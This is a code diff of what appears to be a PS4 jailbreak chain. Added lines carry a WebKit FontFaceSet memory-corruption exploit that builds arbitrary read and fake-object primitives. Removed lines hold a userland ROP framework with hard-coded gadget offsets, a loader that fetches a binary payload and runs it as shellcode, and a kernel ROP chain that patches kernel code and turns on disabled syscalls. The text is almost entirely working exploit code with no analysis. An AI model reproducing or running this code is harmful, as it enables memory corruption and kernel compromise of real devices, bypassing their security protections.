+				ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
+				var badstr2 = mkString(HASHMAP_BUCKET, p_s);
+				needfix.push(mkString(HASHMAP_BUCKET, p_s));
+				bad_fonts[guessed_font].family = "evil2";
+				bad_fonts[guessed_font + 1].family = "evil3";
+				var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
+				if(leak < 0x1000000000000) break;
+			}
+	
+			function makeReader(read_addr, ffs_name) {
+				var fake_s = '';
+				fake_s += '0000'; 
+				fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; 
+				fake_s += ptrToString(read_addr); 
+				fake_s += ptrToString(0x80000014); 
+				p_s = '';
+				p_s += ptrToString(29);
+				p_s += ptrToString(guessed_addr);
+				p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+				p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
+				for(var i = 0; i < 18; i++) p_s += ptrToString(INVALID_POINTER);
+				for(var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
+				var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
+				mkString(HASHMAP_BUCKET, p_s);
+				var relative_read = mkString(HASHMAP_BUCKET, fake_s);
+				bad_fonts[guessed_font].family = ffs_name + "_evil1";
+				bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
+				bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+				needfix.push(relative_read);
+				if(relative_read.length < 1000) 
+					return makeReader(read_addr, ffs_name + '_');
+				return relative_read;
+			}
+			var fastmalloc = makeReader(leak, 'ffs3'); 
+			for(var i = 0; i < 100000; i++) mkString(128, '');
+			var props = [];
+			for(var i = 0; i < 0x10000; i++) {
+				props.push({
+					value: 0x41434442
+				});
+				props.push({
+					value: jsvalue
+				});
+			}
+			Object.defineProperties({}, props);
+			for(var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i += 16) {
+				if(fastmalloc.charCodeAt(i) == 0x42 && fastmalloc.charCodeAt(i + 1) == 0x44 && fastmalloc.charCodeAt(i + 2) == 0x43 && fastmalloc.charCodeAt(i + 3) == 0x41 && fastmalloc.charCodeAt(i + 4) == 0 && fastmalloc.charCodeAt(i + 5) == 0 && fastmalloc.charCodeAt(i + 6) == 254 && fastmalloc.charCodeAt(i + 7) == 255 && fastmalloc.charCodeAt(i + 24) == 14) {
+					var jsvalue_leak = stringToPtr(fastmalloc, i + 32);
+					break;
+				}
+			}
+			var rd_leak = makeReader(jsvalue_leak, 'ffs4');
+			var array256 = stringToPtr(rd_leak, 16); 
+			var ui32a = stringToPtr(rd_leak, 24); 
+			var rd_arr = makeReader(array256, 'ffs5');
+			var butterfly = stringToPtr(rd_arr, 8);
+			var rd_ui32 = makeReader(ui32a, 'ffs6');
+			for(var i = 0; i < 8; i++) union_b[i] = rd_ui32.charCodeAt(i);
+			var structureid_low = union_i[0];
+			var structureid_high = union_i[1];
+			union_i[0] = 0x10000;
+			union_i[1] = 0; 
+			arrays[257][1] = {}; 
+			arrays[257][0] = union_f[0];
+			union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
+			union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
+			arrays[256][i] = union_f[0];
+			pp_s = '';
+			pp_s += ptrToString(56);
+			for(var i = 0; i < 12; i++) pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
+			var fake_s = '';
+			fake_s += '0000'; 
+			fake_s += ptrToString(INVALID_POINTER); 
+			fake_s += ptrToString(butterfly); 
+			fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; 
+			var ffs7_args = [];
+			for(var i = 0; i < 12; i++) ffs7_args.push(bad_fonts[guessed_font + i]);
+			ffs7_args.push(good_font);
+			var ffs8_args = [bad_fonts[guessed_font + 12]];
+			for(var i = 0; i < 5; i++) ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
+			for(var i = 0; i < HAMMER_NSTRINGS; i++) mkString(HASHMAP_BUCKET, pp_s);
+			ffses.ffs7 = new FontFaceSet(ffs7_args);
+			mkString(HASHMAP_BUCKET, pp_s);
+			ffses.ffs8 = new FontFaceSet(ffs8_args);
+			var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+			needfix.push(post_ffs);
+			for(var i = 0; i < 13; i++) bad_fonts[guessed_font + i].family = "hammer" + i;
+	
+			function boot_addrof(obj) {
+				arrays[257][32] = obj;
+				union_f[0] = arrays[258][0];
+				return union_i[1] * 0x100000000 + union_i[0];
+			}
+	
+			function boot_fakeobj(addr) {
+				union_i[0] = addr;
+				union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
+				arrays[258][0] = union_f[0];
+				return arrays[257][32];
+			}
 
-            function enableUSB() {
-                var getpl = new XMLHttpRequest();
-                getpl.open("POST", "./usbon", true);
-                getpl.send(null);
-            }
-
-            function USBWait() {
-                var xhr = new XMLHttpRequest();
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState == XMLHttpRequest.DONE) {
-                        wait = xhr.response;
-                    }
-                }
-                xhr.open('POST', '/usbwait', false);
-                xhr.send(null);
-                return wait;
-            }
-
-            function sleep(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-
-            function hen() {
-                progress.innerHTML = "Loading Goldhen...";
-                var req = new XMLHttpRequest();
-                req.responseType = "arraybuffer";
-                req.open('GET', 'goldhen.bin');
-                req.send();
-                req.onreadystatechange = function() {
-                    if (req.readyState == 4) {
-                        PLD = req.response;
-                        var payload_buffer = chain.syscall(477, 0, PLD.byteLength * 4, 7, 0x1002, -1, 0);
-                        var pl = p.array_from_address(payload_buffer, PLD.byteLength * 4);
-                        var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-                        var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-                        tmp.set(new Uint8Array(req.response), 0);
-                        tmp.set(padding, req.response.byteLength);
-                        var shellcode = new Uint32Array(tmp.buffer);
-                        pl.set(shellcode, 0);
-                        var pthread = p.malloc(0x10);
-                        chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
-                        allset();
-                    }
-                };
-            }
-
-            function int64(low, hi) {
-                this.low = (low >>> 0);
-                this.hi = (hi >>> 0);
-                this.add32inplace = function(val) {
-                    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-                    var new_hi = (this.hi >>> 0);
-                    if (new_lo < this.low) {
-                        new_hi++;
-                    }
-                    this.hi = new_hi;
-                    this.low = new_lo;
-                }
-                this.add32 = function(val) {
-                    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-                    var new_hi = (this.hi >>> 0);
-                    if (new_lo < this.low) {
-                        new_hi++;
-                    }
-                    return new int64(new_lo, new_hi);
-                }
-                this.sub32 = function(val) {
-                    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-                    var new_hi = (this.hi >>> 0);
-                    if (new_lo > (this.low) & 0xFFFFFFFF) {
-                        new_hi--;
-                    }
-                    return new int64(new_lo, new_hi);
-                }
-                this.sub32inplace = function(val) {
-                    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-                    var new_hi = (this.hi >>> 0);
-                    if (new_lo > (this.low) & 0xFFFFFFFF) {
-                        new_hi--;
-                    }
-                    this.hi = new_hi;
-                    this.low = new_lo;
-                }
-                this.and32 = function(val) {
-                    var new_lo = this.low & val;
-                    var new_hi = this.hi;
-                    return new int64(new_lo, new_hi);
-                }
-                this.and64 = function(vallo, valhi) {
-                    var new_lo = this.low & vallo;
-                    var new_hi = this.hi & valhi;
-                    return new int64(new_lo, new_hi);
-                }
-                this.toString = function(val) {
-                    val = 16;
-                    var lo_str = (this.low >>> 0).toString(val);
-                    var hi_str = (this.hi >>> 0).toString(val);
-                    if (this.hi == 0) return lo_str;
-                    else lo_str = zeroFill(lo_str, 8)
-                    return hi_str + lo_str;
-                }
-                return this;
-            }
-
-            function zeroFill(number, width) {
-                width -= number.toString().length;
-                if (width > 0) {
-                    return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
-                }
-                return number + "";
-            }
-
-            function zeroFill(number, width) {
-                width -= number.toString().length;
-                if (width > 0) {
-                    return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
-                }
-                return number + "";
-            }
-            const stack_sz = 0x40000;
-            const reserve_upper_stack = 0x10000;
-            const stack_reserved_idx = reserve_upper_stack / 4;
-            window.rop = function() {
-                this.stackback = p.malloc32(stack_sz / 4 + 0x8);
-                this.stack = this.stackback.add32(reserve_upper_stack);
-                this.stack_array = this.stackback.backing;
-                this.retval = this.stackback.add32(stack_sz);
-                this.count = 1;
-                this.branches_count = 0;
-                this.branches_rsps = p.malloc(0x200);
-                this.clear = function() {
-                    this.count = 1;
-                    this.branches_count = 0;
-                    for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
-                        this.stack_array[i + stack_reserved_idx] = 0;
-                    }
-                };
-                this.pushSymbolic = function() {
-                    this.count++;
-                    return this.count - 1;
-                }
-                this.finalizeSymbolic = function(idx, val) {
-                    if (val instanceof int64) {
-                        this.stack_array[stack_reserved_idx + idx * 2] = val.low;
-                        this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
-                    } else {
-                        this.stack_array[stack_reserved_idx + idx * 2] = val;
-                        this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
-                    }
-                }
-                this.push = function(val) {
-                    this.finalizeSymbolic(this.pushSymbolic(), val);
-                }
-                this.push_write8 = function(where, what) {
-                    this.push(gadgets["pop rdi"]);
-                    this.push(where);
-                    this.push(gadgets["pop rsi"]);
-                    this.push(what);
-                    this.push(gadgets["mov [rdi], rsi"]);
-                }
-                this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
-                    if (rdi != undefined) {
-                        this.push(gadgets["pop rdi"]);
-                        this.push(rdi);
-                    }
-                    if (rsi != undefined) {
-                        this.push(gadgets["pop rsi"]);
-                        this.push(rsi);
-                    }
-                    if (rdx != undefined) {
-                        this.push(gadgets["pop rdx"]);
-                        this.push(rdx);
-                    }
-                    if (rcx != undefined) {
-                        this.push(gadgets["pop rcx"]);
-                        this.push(rcx);
-                    }
-                    if (r8 != undefined) {
-                        this.push(gadgets["pop r8"]);
-                        this.push(r8);
-                    }
-                    if (r9 != undefined) {
-                        this.push(gadgets["pop r9"]);
-                        this.push(r9);
-                    }
-                    if (this.stack.add32(this.count * 0x8).low & 0x8) {
-                        this.push(gadgets["ret"]);
-                    }
-                    this.push(rip);
-                    return this;
-                }
-                this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
-                    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
-                    this.write_result(this.retval);
-                    this.run();
-                    return p.read8(this.retval);
-                }
-                this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-                    return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
-                }
-                this.get_rsp = function() {
-                    return this.stack.add32(this.count * 8);
-                }
-                this.write_result = function(where) {
-                    this.push(gadgets["pop rdi"]);
-                    this.push(where);
-                    this.push(gadgets["mov [rdi], rax"]);
-                }
-                this.write_result4 = function(where) {
-                    this.push(gadgets["pop rdi"]);
-                    this.push(where);
-                    this.push(gadgets["mov [rdi], eax"]);
-                }
-                this.jmp_rsp = function(rsp) {
-                    this.push(window.gadgets["pop rsp"]);
-                    this.push(rsp);
-                }
-                this.run = function() {
-                    p.launch_chain(this);
-                    this.clear();
-                }
-                this.KERNEL_BASE_PTR_VAR;
-                this.set_kernel_var = function(arg) {
-                    this.KERNEL_BASE_PTR_VAR = arg;
-                }
-                this.rax_kernel = function(offset) {
-                    this.push(gadgets["pop rax"]);
-                    this.push(this.KERNEL_BASE_PTR_VAR)
-                    this.push(gadgets["mov rax, [rax]"]);
-                    this.push(gadgets["pop rsi"]);
-                    this.push(offset)
-                    this.push(gadgets["add rax, rsi"]);
-                }
-                this.write_kernel_addr_to_chain_later = function(offset) {
-                    this.push(gadgets["pop rdi"]);
-                    var idx = this.pushSymbolic();
-                    this.rax_kernel(offset);
-                    this.push(gadgets["mov [rdi], rax"]);
-                    return idx;
-                }
-                this.kwrite8 = function(offset, qword) {
-                    this.rax_kernel(offset);
-                    this.push(gadgets["pop rsi"]);
-                    this.push(qword);
-                    this.push(gadgets["mov [rax], rsi"]);
-                }
-                this.kwrite4 = function(offset, dword) {
-                    this.rax_kernel(offset);
-                    this.push(gadgets["pop rdx"]);
-                    this.push(dword);
-                    this.push(gadgets["mov [rax], edx"]);
-                }
-                this.kwrite2 = function(offset, word) {
-                    this.rax_kernel(offset);
-                    this.push(gadgets["pop rcx"]);
-                    this.push(word);
-                    this.push(gadgets["mov [rax], cx"]);
-                }
-                this.kwrite1 = function(offset, byte) {
-                    this.rax_kernel(offset);
-                    this.push(gadgets["pop rcx"]);
-                    this.push(byte);
-                    this.push(gadgets["mov [rax], cl"]);
-                }
-                this.kwrite8_kaddr = function(offset1, offset2) {
-                    this.rax_kernel(offset2);
-                    this.push(gadgets["mov rdx, rax"]);
-                    this.rax_kernel(offset1);
-                    this.push(gadgets["mov [rax], rdx"]);
-                }
-                return this;
-            };
-            var chain;
-            var kchain;
-            var kchain2;
-            var SAVED_KERNEL_STACK_PTR;
-            var KERNEL_BASE_PTR;
-            var webKitBase;
-            var webKitRequirementBase;
-            var libSceLibcInternalBase;
-            var libKernelBase;
-            var textArea = document.createElement("textarea");
-            const OFFSET_wk_vtable_first_element = 0x104F110;
-            const OFFSET_WK_memset_import = 0x000002A8;
-            const OFFSET_WK___stack_chk_fail_import = 0x00000178;
-            const OFFSET_WK_psl_builtin_import = 0xD68;
-            const OFFSET_WKR_psl_builtin = 0x33BA0;
-            const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
-            const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
-            const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
-            const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
-            const OFFSET_libcint_memset = 0x0004F810;
-            const OFFSET_libcint_setjmp = 0x000BB5BC;
-            const OFFSET_libcint_longjmp = 0x000BB616;
-            const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
-            const OFFSET_lk___stack_chk_fail = 0x0001FF60;
-            const OFFSET_lk_pthread_create = 0x00025510;
-            const OFFSET_lk_pthread_join = 0x0000AFA0;
-            var nogc = [];
-            var syscalls = {};
-            var gadgets = {};
-            var wk_gadgetmap = {
-                "ret": 0x32,
-                "pop rdi": 0x319690,
-                "pop rsi": 0x1F4D6,
-                "pop rdx": 0x986C,
-                "pop rcx": 0x657B7,
-                "pop r8": 0xAFAA71,
-                "pop r9": 0x422571,
-                "pop rax": 0x51A12,
-                "pop rsp": 0x4E293,
-                "mov [rdi], rsi": 0x1A97920,
-                "mov [rdi], rax": 0x10788F7,
-                "mov [rdi], eax": 0x9964BC,
-                "cli ; pop rax": 0x566F8,
-                "sti": 0x1FBBCC,
-                "mov rax, [rax]": 0x241CC,
-                "mov rax, [rsi]": 0x5106A0,
-                "mov [rax], rsi": 0x1EFD890,
-                "mov [rax], rdx": 0x1426A82,
-                "mov [rax], edx": 0x3B7FE4,
-                "add rax, rsi": 0x170397E,
-                "mov rdx, rax": 0x53F501,
-                "add rax, rcx": 0x2FBCD,
-                "mov rsp, rdi": 0x2048062,
-                "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
-                "infloop": 0x7DFF,
-                "mov [rax], cl": 0xC6EAF,
-            };
-            var wkr_gadgetmap = {
-                "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0
-            };
-            var wk2_gadgetmap = {
-                "mov [rax], rdi": 0xFFDD7,
-                "mov [rax], rcx": 0x2C9ECA,
-                "mov [rax], cx": 0x15A7D52,
-            };
-            var hmd_gadgetmap = {
-                "add [r8], r12": 0x2BCE1
-            };
-            var ipmi_gadgetmap = {
-                "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
-            };
-
-            function userland() {
-                p.launch_chain = launch_chain;
-                p.malloc = malloc;
-                p.malloc32 = malloc32;
-                p.stringify = stringify;
-                p.array_from_address = array_from_address;
-                p.readstr = readstr;
-                var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
-                var textAreaVtable = p.read8(textAreaVtPtr);
-                webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
-                libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
-                libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
-                libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
-                libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
-                webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
-                webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
-                for (var gadget in wk_gadgetmap) {
-                    window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
-                }
-                for (var gadget in wkr_gadgetmap) {
-                    window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
-                }
-
-                function get_jmptgt(address) {
-                    var instr = p.read4(address) & 0xFFFF;
-                    var offset = p.read4(address.add32(2));
-                    if (instr != 0x25FF) {
-                        return 0;
-                    }
-                    return address.add32(0x6 + offset);
-                }
-
-                function malloc(sz) {
-                    var backing = new Uint8Array(0x10000 + sz);
-                    window.nogc.push(backing);
-                    var ptr = p.read8(p.leakval(backing).add32(0x10));
-                    ptr.backing = backing;
-                    return ptr;
-                }
-
-                function malloc32(sz) {
-                    var backing = new Uint8Array(0x10000 + sz * 4);
-                    window.nogc.push(backing);
-                    var ptr = p.read8(p.leakval(backing).add32(0x10));
-                    ptr.backing = new Uint32Array(backing.buffer);
-                    return ptr;
-                }
-
-                function array_from_address(addr, size) {
-                    var og_array = new Uint32Array(0x1000);
-                    var og_array_i = p.leakval(og_array).add32(0x10);
-                    p.write8(og_array_i, addr);
-                    p.write4(og_array_i.add32(0x8), size);
-                    p.write4(og_array_i.add32(0xC), 0x1);
-                    nogc.push(og_array);
-                    return og_array;
-                }
-
-                function stringify(str) {
-                    var bufView = new Uint8Array(str.length + 1);
-                    for (var i = 0; i < str.length; i++) {
-                        bufView[i] = str.charCodeAt(i) & 0xFF;
-                    }
-                    window.nogc.push(bufView);
-                    return p.read8(p.leakval(bufView).add32(0x10));
-                }
-
-                function readstr(addr) {
-                    var str = "";
-                    for (var i = 0;; i++) {
-                        var c = p.read1(addr.add32(i));
-                        if (c == 0x0) {
-                            break;
-                        }
-                        str += String.fromCharCode(c);
-                    }
-                    return str;
-                }
-                var fakeVtable_setjmp = p.malloc32(0x200);
-                var fakeVtable_longjmp = p.malloc32(0x200);
-                var original_context = p.malloc32(0x40);
-                var modified_context = p.malloc32(0x40);
-                p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
-                p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
-                p.write8(fakeVtable_setjmp.add32(0x10), original_context);
-                p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
-                p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
-                p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
-                p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
-                p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
-                p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
-                p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
-
-                function launch_chain(chain) {
-                    chain.push(window.gadgets["pop rdi"]);
-                    chain.push(original_context);
-                    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
-                    p.write8(textAreaVtPtr, fakeVtable_setjmp);
-                    textArea.scrollLeft = 0x0;
-                    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
-                    p.write8(modified_context.add32(0x10), chain.stack);
-                    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))
-                    p.write8(textAreaVtPtr, fakeVtable_longjmp);
-                    textArea.scrollLeft = 0x0;
-                    p.write8(textAreaVtPtr, textAreaVtable);
-                }
-                var kview = new Uint8Array(0x1000);
-                var kstr = p.leakval(kview).add32(0x10);
-                var orig_kview_buf = p.read8(kstr);
-                p.write8(kstr, window.libKernelBase);
-                p.write4(kstr.add32(8), 0x40000);
-                var countbytes;
-                for (var i = 0; i < 0x40000; i++) {
-                    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
-                        countbytes = i;
-                        break;
-                    }
-                }
-                p.write4(kstr.add32(8), countbytes + 32);
-                var dview32 = new Uint32Array(1);
-                var dview8 = new Uint8Array(dview32.buffer);
-                for (var i = 0; i < countbytes; i++) {
-                    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
-                        dview8[0] = kview[i + 3];
-                        dview8[1] = kview[i + 4];
-                        dview8[2] = kview[i + 5];
-                        dview8[3] = kview[i + 6];
-                        var syscallno = dview32[0];
-                        window.syscalls[syscallno] = window.libKernelBase.add32(i);
-                    }
-                }
-                p.write8(kstr, orig_kview_buf);
-                chain = new rop();
-                if (chain.syscall(20).low == 0) {
-                    alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
-                    while (1);
-                }
-            }
-
-            function run_hax() {
-                userland();
-                if (chain.syscall(23, 0).low != 0x0) {
-                    enableUSB();
-                    kernel();
-                } else {
-                    hen();
-                }
-            }
-
-            function kernel() {
-                extra_gadgets();
-                kchain_setup();
-                object_setup();
-                trigger_spray();
-            }
-            var handle;
-            var random_path;
-            var ex_info;
-
-            function load_prx(name) {
-                var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
-                if (res.low != 0x0) {
-                    alert("failed to load prx/get handle " + name);
-                }
-                p.write8(ex_info, 0x1A8);
-                res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
-                if (res.low != 0x0) {
-                    alert("failed to get module info from handle");
-                }
-                var tlsinit = p.read8(ex_info.add32(0x110));
-                var tlssize = p.read4(ex_info.add32(0x11C));
-                if (tlssize != 0) {
-                    if (name == "libSceWebKit2.sprx") {
-                        tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
-                    } else {
-                        alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
-                    }
-                }
-                return tlsinit;
-            }
-
-            function extra_gadgets() {
-                handle = p.malloc(0x1E8);
-                var randomized_path_length_ptr = handle.add32(0x4);
-                var randomized_path_ptr = handle.add32(0x14);
-                ex_info = randomized_path_ptr.add32(0x40);
-                p.write8(randomized_path_length_ptr, 0x2C);
-                chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
-                random_path = p.readstr(randomized_path_ptr);
-                var ipmi_addr = load_prx("libSceIpmi.sprx");
-                var hmd_addr = load_prx("libSceHmd.sprx");
-                var wk2_addr = load_prx("libSceWebKit2.sprx");
-                for (var gadget in hmd_gadgetmap) {
-                    window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
-                }
-                for (var gadget in wk2_gadgetmap) {
-                    window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
-                }
-                for (var gadget in ipmi_gadgetmap) {
-                    window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
-                }
-                for (var gadget in window.gadgets) {
-                    p.read8(window.gadgets[gadget]);
-                    chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
-                }
-                chain.run();
-            }
-
-            function kchain_setup() {
-                const KERNEL_busy = 0x1B28DF8;
-                const KERNEL_bcopy = 0xACD;
-                const KERNEL_bzero = 0x2713FD;
-                const KERNEL_pagezero = 0x271441;
-                const KERNEL_memcpy = 0x2714BD;
-                const KERNEL_pagecopy = 0x271501;
-                const KERNEL_copyin = 0x2716AD;
-                const KERNEL_copyinstr = 0x271B5D;
-                const KERNEL_copystr = 0x271C2D;
-                const KERNEL_setidt = 0x312c40;
-                const KERNEL_setcr0 = 0x1FB949;
-                const KERNEL_Xill = 0x17d500;
-                const KERNEL_veriPatch = 0x626874;
-                const KERNEL_enable_syscalls_1 = 0x490;
-                const KERNEL_enable_syscalls_2 = 0x4B5;
-                const KERNEL_enable_syscalls_3 = 0x4B9;
-                const KERNEL_enable_syscalls_4 = 0x4C2;
-                const KERNEL_mprotect = 0x80B8D;
-                const KERNEL_prx = 0x23AEC4;
-                const KERNEL_dlsym_1 = 0x23B67F;
-                const KERNEL_dlsym_2 = 0x221b40;
-                const KERNEL_setuid = 0x1A06;
-                const KERNEL_syscall11_1 = 0x1100520;
-                const KERNEL_syscall11_2 = 0x1100528;
-                const KERNEL_syscall11_3 = 0x110054C;
-                const KERNEL_syscall11_gadget = 0x4c7ad;
-                const KERNEL_mmap_1 = 0x16632A;
-                const KERNEL_mmap_2 = 0x16632D;
-                const KERNEL_setcr0_patch = 0x3ade3B;
-                const KERNEL_kqueue_close_epi = 0x398991;
-                SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
-                KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
-                p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
-                kchain = new rop();
-                kchain2 = new rop(); {
-                    chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
-                    chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
-                    chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
-                }
-                chain.run();
-                kchain.count = 0;
-                kchain2.count = 0;
-                kchain.set_kernel_var(KERNEL_BASE_PTR);
-                kchain2.set_kernel_var(KERNEL_BASE_PTR);
-                kchain.push(gadgets["pop rax"]);
-                kchain.push(SAVED_KERNEL_STACK_PTR);
-                kchain.push(gadgets["mov [rax], rdi"]);
-                kchain.push(gadgets["pop r8"]);
-                kchain.push(KERNEL_BASE_PTR);
-                kchain.push(gadgets["add [r8], r12"]);
-                kchain.kwrite1(KERNEL_busy, 0x1);
-                kchain.push(gadgets["sti"]);
-                var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
-                var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
-                kchain.push(gadgets["pop rdi"]);
-                kchain.push(0x6);
-                kchain.push(gadgets["pop rsi"]);
-                kchain.push(gadgets["mov rsp, rdi"]);
-                kchain.push(gadgets["pop rdx"]);
-                kchain.push(0xE);
-                kchain.push(gadgets["pop rcx"]);
-                kchain.push(0x0);
-                kchain.push(gadgets["pop r8"]);
-                kchain.push(0x0);
-                var idx1_dest = kchain.get_rsp();
-                kchain.pushSymbolic();
-                kchain.push(gadgets["pop rsi"]);
-                kchain.push(0x80040033);
-                kchain.push(gadgets["pop rdi"]);
-                kchain.push(kchain2.stack);
-                var idx2_dest = kchain.get_rsp();
-                kchain.pushSymbolic();
-                kchain.finalizeSymbolic(idx1, idx1_dest);
-                kchain.finalizeSymbolic(idx2, idx2_dest);
-                kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
-                kchain2.kwrite1(KERNEL_bcopy, 0xEB);
-                kchain2.kwrite1(KERNEL_bzero, 0xEB);
-                kchain2.kwrite1(KERNEL_pagezero, 0xEB);
-                kchain2.kwrite1(KERNEL_memcpy, 0xEB);
-                kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
-                kchain2.kwrite1(KERNEL_copyin, 0xEB);
-                kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
-                kchain2.kwrite1(KERNEL_copystr, 0xEB);
-                kchain2.kwrite1(KERNEL_busy, 0x0);
-                var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
-                var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
-                kchain2.push(gadgets["pop rdi"]);
-                kchain2.push(0x6);
-                kchain2.push(gadgets["pop rsi"]);
-                var idx3_dest = kchain2.get_rsp();
-                kchain2.pushSymbolic();
-                kchain2.push(gadgets["pop rdx"]);
-                kchain2.push(0xE);
-                kchain2.push(gadgets["pop rcx"]);
-                kchain2.push(0x0);
-                kchain2.push(gadgets["pop r8"]);
-                kchain2.push(0x0);
-                var idx4_dest = kchain2.get_rsp();
-                kchain2.pushSymbolic();
-                kchain2.finalizeSymbolic(idx3, idx3_dest);
-                kchain2.finalizeSymbolic(idx4, idx4_dest);
-                kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
-                kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
-                kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
-                kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
